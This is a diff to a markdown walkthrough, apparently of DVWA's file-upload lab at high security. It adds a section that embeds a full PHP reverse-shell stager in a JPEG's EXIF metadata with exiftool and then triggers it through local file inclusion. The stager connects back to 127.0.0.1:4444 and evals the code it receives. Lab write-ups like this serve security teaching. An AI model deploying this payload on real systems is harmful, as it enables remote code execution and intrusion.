@@ -370,7 +370,6 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
     ![](high_shell_null.png)
 
-
 10. If you try to call it by just visiting the given path it won't work:
 
     ![](high_revshell_null_fail.png)
@@ -378,6 +377,27 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 11. However, if you remove everything after `.php` it should send a reverse shell back:
 
     ![](high_revshell_null_success.png)
+
+### Injecting file's metadata and using LFI
+
+1. We can download a low resolution image, such as [this](https://www.bestprintingonline.com/help_resources/Image/Ducky_Head_Web_Low-Res.jpg), and the `.php` extension, and inject our payload into the image's metadata:
+
+    ```shell
+    cp duck.jpg duck.php.jpg
+    ```
+
+    ```shell
+    exiftool -DocumentName='/*<?php /**/ error_reporting(0); $ip = "127.0.0.1"; $port = 4444; if (($f = "stream_socket_client") && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = "stream"; } elseif (($f = "fsockopen") && is_callable($f)) { $s = $f($ip, $port); $s_type = "stream"; } elseif (($f = "socket_create") && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = "socket"; } else { die("no socket funcs"); } if (!$s) { die("no socket"); } switch ($s_type) { case "stream": $len = fread($s, 4); break; case "socket": $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a["len"]; $b = ""; while (strlen($b) < $len) { switch ($s_type) { case "stream": $b .= fread($s, $len-strlen($b)); break; case "socket": $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS["msgsock"] = $s; $GLOBALS["msgsock_type"] = $s_type; eval($b); die(); __halt_compiler();' duck.jpg
+        1 image files updated
+    ```
+
+    ![](metadata.png)
+
+    ![](exif_image_browser.png)
+
+2. The we have to set the security level back to Low and call the image via LFI:
+
+    ![](lfi_high.png)
 
 ## Security: Impossible
 
